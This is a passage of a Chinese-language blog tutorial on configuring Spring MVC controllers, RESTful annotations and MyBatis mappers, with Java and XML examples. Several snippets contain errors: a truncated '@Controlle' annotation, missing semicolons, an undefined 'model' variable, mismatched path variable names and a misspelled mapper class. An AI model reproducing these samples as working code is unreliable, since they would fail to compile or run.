class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>即配置<em>/example/**下的所有请求都被名叫</em>servlet_name<em>的servlet处理(具体配置文件为</em>/WEB-INF/servlet_name-servlet.xml*)</p><p>当然也有用java配置类的方法,只需要继承<em>org.springframework.web</em>下的<em>WebApplicationInitializer</em>接口即可<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyWebApplicationInitializer</span> <span class="keyword">implements</span> <span class="title">WebApplicationInitializer</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onStartup</span><span class="params">(ServletContext container)</span> </span>&#123;</span><br><span class="line">        ServletRegistration.Dynamic registration = container.addServlet(<span class="string">"servlet_name"</span>,</span><br><span class="line">        <span class="keyword">new</span> DispatcherServlet());</span><br><span class="line">        registration.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">        registration.addMapping(<span class="string">"/example/*"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="仅有单个Servlet的配置-特殊"><a href="#仅有单个Servlet的配置-特殊" class="headerlink" title="仅有单个Servlet的配置(特殊)"></a>仅有单个Servlet的配置(特殊)</h3><ul><li>仅需要配置<em>applicationContext.xml</em></li></ul><p>如果仅有一个Servlet,那么可以将将所有请求拦截,然后交由Spring的<em>ApplicationContext</em>(或者说<em>Root</em>的<em>WebApplicationContext</em>)处理.</p><p>在web.xml下进行如下配置<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 可以折么修改applicationContext.xml的名字 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;context-param&gt;</span></span><br><span class="line"><span class="comment">        &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span></span><br><span class="line"><span class="comment">        &lt;param-value&gt;/WEB-INF/root-context.xml&lt;/param-value&gt;</span></span><br><span class="line"><span class="comment">    &lt;/context-param&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcher<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span></span></span><br><span class="line"><span class="tag">        &gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 也可以这么修改applicationContext.xml的名字 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;init-param&gt;</span></span><br><span class="line"><span class="comment">            &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span></span><br><span class="line"><span class="comment">            &lt;param-value&gt;&lt;/param-value&gt;</span></span><br><span class="line"><span class="comment">        &lt;/init-param&gt; --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcher<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>btw: 除了<em>ContextLoaderListener</em>,还有<em>ContextLoaderServlet</em>的实现</p><h2 id="SpringMVC的Controller"><a href="#SpringMVC的Controller" class="headerlink" title="SpringMVC的Controller"></a>SpringMVC的Controller</h2><h3 id="基于注解的配置-1"><a href="#基于注解的配置-1" class="headerlink" title="基于注解的配置"></a>基于注解的配置</h3><p><em>IndexController.java</em>(在<em>com.test</em>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span> <span class="comment">// 类似于@Component但是是由springmvc解析</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/"</span>) <span class="comment">//指定此Controller绑定到 '/'路径</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(method = RequestMethod.GET)<span class="comment">//指定此函数方法绑定的是get方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(ModelMap model)</span></span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">"message"</span>, <span class="string">"Spring MVC XML Config Example"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"index"</span>;<span class="comment">//使用了(@Response)Mapping而不是(@Response)Body所以去寻找index的view</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>index.jsp</em>(在<em>/WEB-INF/views/</em>下)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>$&#123;message&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p><em>servlet_name-servlet.xml</em></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 拦截所有请求时,需要此配置来使@Controller获得比&lt;mvc:default-servlet-handler/&gt; 更高的优先级 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 默认处理 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;context:annotation-config/&gt; 见上面Spring部分 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.test"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 视图解析器,为返回的字符串添加前缀与后缀 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"viewClass"</span> <span class="attr">value</span>=<span class="string">"org.springframework.web.servlet.view.JstlView"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/WEB-INF/views/"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span> <span class="attr">value</span>=<span class="string">".jsp"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时访问<em><a href="http://localhost:8080/example/" target="_blank" rel="noopener">http://localhost:8080/example/</a></em>即可看到由<em>IndexController</em>传递<em>message</em>给<em>/WEB-INF/views/index.jsp</em>并显示的页面 </p><ul><li><em>Controller</em>中的<em>model</em>的区别</li></ul><table><thead><tr><th>Model</th><th>特点</th><th>使用</th><th>返回</th></tr></thead><tbody><tr><td>ModelMap</td><td>由Spring自动创建</td><td>作为函数方法的参数接受,并使用<em>addAttribute</em>传递参数</td><td>返回<em>String</em></td></tr><tr><td>ModelAndView</td><td>自己手动创建</td><td>使用<em>new</em>来创建,并使用<em>addObject</em>传递参数</td><td>返回<em>Model</em></td></tr></tbody></table><ul><li>返回字符串的关键字</li></ul><table><thead><tr><th>String</th><th>作用</th></tr></thead><tbody><tr><td>forward:</td><td>服务器转发</td></tr><tr><td>redirect:</td><td>客户端转发</td></tr></tbody></table><h3 id="基于xml的配置-1"><a href="#基于xml的配置-1" class="headerlink" title="基于xml的配置"></a>基于xml的配置</h3><p>java继承并重写<em>Controller(org.springframework.web.servlet.mvc)</em>的<em>handleRequest</em>函数即可<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">implements</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModelAndView <span class="title">handleRequest</span><span class="params">(HttpServletRequest req, </span></span></span><br><span class="line"><span class="function"><span class="params">                                            HttpServletResponse res)</span> </span></span><br><span class="line"><span class="function">                                                     <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(<span class="string">"index"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p><em>index.jsp</em>不变</p><p><em>servlet_name-servlet.xml</em><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 因为id不能包括'/' --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 而DispatcherServlet注册的BeanNameUrlHandlerMapping需要以'/'开头 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 所以只能设置为name别名 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">name</span>=<span class="string">"/"</span> <span class="attr">class</span>=<span class="string">"com.test.IndexController"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 视图解析器,为返回的字符串添加前缀与后缀 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"viewClass"</span> <span class="attr">value</span>=<span class="string">"org.springframework.web.servlet.view.JstlView"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/WEB-INF/views/"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span> <span class="attr">value</span>=<span class="string">".jsp"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="基于java配置类的配置-1"><a href="#基于java配置类的配置-1" class="headerlink" title="基于java配置类的配置"></a>基于java配置类的配置</h3><p>参见Srping部分</p><p>即是<em>@Configuration</em> ,<em>@ComponentScan</em> 和<em>@Bean</em> 等的使用</p><h2 id="RESTFul"><a href="#RESTFul" class="headerlink" title="RESTFul"></a>RESTFul</h2><p><em>RESTFul</em>,即符合REST(Representational State Transfer) principles的系統,通常用来做<em>api</em>,使用<em>json</em>(大多数)或<em>xml</em>通过<em>http</em>的方法来传递参数</p><p>我的理解即是视任何东西为对象,用各种http方法(<em>PUT</em>,<em>GET</em>,<em>DELETE</em>,<em>PATCH</em>等)来标识作用,真正要用的时候查查<a href="https://developer.github.com/v3/" target="_blank" rel="noopener">github的Api</a>看看怎么写的照猫画虎就OK 😂</p><p>SpringMVC中使用<em>@RequestMapping</em>,<em>@PathVariable</em>,<em>@RequestBody</em>和<em>@ResponseBody</em>来方便的实现<em>RESTFul</em></p><table><thead><tr><th>注解</th><th>作用</th></tr></thead><tbody><tr><td><em>@RequestMapping</em></td><td>绑定<em>Controller</em>到指定路径(api的)</td></tr><tr><td><em>@PathVariable</em></td><td>标识路径中的变量与函数方法参数的关系</td></tr><tr><td><em>@RequestBody</em></td><td>用来获取传入的数据(<em>json</em>/<em>xml</em>)</td></tr><tr><td><em>@ResponseBody</em></td><td>用来直接返回数据而不是调用<em>model</em></td></tr></tbody></table><ul><li>Example:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controlle</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value=<span class="string">"/postJson"</span>,method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(@RequestBody Id_And_Name ian)</span></span>&#123;</span><br><span class="line">        StringBuffer sb=<span class="keyword">new</span> StringBuffer(<span class="string">""</span>);</span><br><span class="line">        sb.append(ian.id);</span><br><span class="line">        sb.append(<span class="string">"----&gt;"</span>);</span><br><span class="line">        sb.append(ian.name)</span><br><span class="line">        model.addAttribute(<span class="string">"message"</span>, sb.toString());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"index"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(value=<span class="string">"/getJson/&#123;id&#125;"</span>,method = RequestMethod.GET)</span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Id_And_Name <span class="title">index</span><span class="params">(@PathVariable <span class="keyword">int</span> uid)</span></span>&#123;</span><br><span class="line">        Id_And_Name ian=<span class="keyword">new</span> Id_And_Name().get_name_by_id(uid)</span><br><span class="line">        <span class="keyword">return</span> ian;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>btw: RPC就是使用二进制,而不是http,实现不同系统间相互通信</p><h1 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h1><p>Mybatis(ibatis)</p><p>他通过<em>SqlSession</em>(由<em>SqlSessionFactory</em>创建)来执行(<em>Excutor()</em>)各种操作</p><p>我个人感觉折腾这个比折腾<em>hibernate</em>麻烦(当然是在使用<em>Intellij IDEA</em>的情况下)</p><h2 id="Mybatis配置"><a href="#Mybatis配置" class="headerlink" title="Mybatis配置"></a><em>Mybatis</em>配置</h2><h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><ul><li><p>通过<em>mybatis-config.xml</em>来进行配置坏境</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入.properties文件,使得可以在下面的配置中引用 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- db.properties文件中有jdbc.password=toor等 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span> <span class="attr">resource</span>=<span class="string">"db.properties"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">"development"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">"development"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 采用jdbc的事务管理 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">"JDBC"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">"POOLED"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driver"</span> <span class="attr">value</span>=<span class="string">"com.mysql.jdbc.Driver"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"url"</span> <span class="attr">value</span>=<span class="string">"jdbc:mysql://localhost:3306/test"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"root"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">$&#123;jdbc.password&#125;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>  选择的数据表每条数据包含<em>id</em>,<em>username</em>,<em>password</em>内容</p><p>  实体类<em>User</em>(<em>com.test.entity</em>)</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    String username;</span><br><span class="line">    String password;</span><br><span class="line">    <span class="comment">// set,get方法略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="配置数据库方法"><a href="#配置数据库方法" class="headerlink" title="配置数据库方法"></a>配置数据库方法</h3><ul><li><p>仅使用xml文件配置</p><ul><li><p><em>mybatis-config.xml</em></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 引用具体的mapper文件 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">"com/test/mapper/UserMapper.xml"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>被引用的<em>UserMapper.xml</em>文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- namespace的值习惯上设置成包名+sql映射文件名 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">"com.test.mapper.UserMapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectUserById"</span> <span class="attr">parameterType</span>=<span class="string">"int"</span> <span class="attr">resultType</span>=<span class="string">"user"</span>&gt;</span></span><br><span class="line">        select * from user where id=#&#123;id&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"name !=null"</span>&gt;</span></span><br><span class="line">            and name=#&#123;name&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectUserListByName"</span> <span class="attr">parameterType</span>=<span class="string">"string"</span> <span class="attr">resultType</span>=<span class="string">"user"</span>&gt;</span></span><br><span class="line">        select * from user where username=#&#123;name&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"saveUser"</span> <span class="attr">parameterType</span>=<span class="string">"user"</span>&gt;</span></span><br><span class="line">        insert into user values(#&#123;username&#125;,#&#123;password&#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">"deleteUserById"</span> <span class="attr">parameterType</span>=<span class="string">"int"</span>&gt;</span></span><br><span class="line">        delete from user where id=#&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">"udpateUserById"</span> <span class="attr">parameterType</span>=<span class="string">"user"</span>&gt;</span></span><br><span class="line">        update user set username=#&#123;username&#125; where id=#&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>或者使用Mapper代理方式(写个接口)的方式配置</p><ul><li><p>UserMapper.java </p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserMapper</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">selectUserById</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">deleteUserById</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  <em>mybatis-config.xml</em>与<em>UserMapper.xml</em>文件不变</p><ol><li><p><em>UserMapper.xml</em>中的<em>namespace</em>等于<em>mapper接口</em>地址</p></li><li><p>接口中的函数方法名与xml中的statemen的id一致</p></li><li><p>输入输出的类型要一致</p></li></ol></li></ul></li><li><p>或者直接在Mapper接口上进行注解</p><ul><li><p>UserMapper.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserMapper</span> </span>&#123;</span><br><span class="line">    <span class="meta">@select</span>(<span class="string">"select * from user where id=#&#123;id&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">selectUserById</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br><span class="line">    <span class="meta">@Delete</span>(<span class="string">"delete from user where id=#&#123;id&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">deleteUserById</span><span class="params">(@Param(<span class="string">"id"</span>)</span> <span class="keyword">int</span> uid)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>UserMapper.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 引用mapper的class --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">class</span>=<span class="string">"com.test.mapper.UserMappe"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>另外,使用<em>typeAliases</em>可设置别名从而精简书写量</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 手动 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">typeAlias</span> <span class="attr">type</span>=<span class="string">"com.test.entity.User"</span> <span class="attr">alias</span>=<span class="string">"user"</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 自动,以首字母小写的非限定类名来作为它的别名--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"com.test.mapper.UserMapper"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><table><thead><tr><th>mapper</th><th>特点</th></tr></thead><tbody><tr><td>resource</td><td>xml文件</td></tr><tr><td>class</td><td>接口上注解</td></tr></tbody></table><h2 id="使用Spring管理Mybatis"><a href="#使用Spring管理Mybatis" class="headerlink" title="使用Spring管理Mybatis"></a>使用Spring管理Mybatis</h2><p>这里的管理指的是</p><ul><li>数据源</li><li>sqlSession</li><li>Mapper</li></ul><p>在<em>Spring-context.xml</em>中<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span 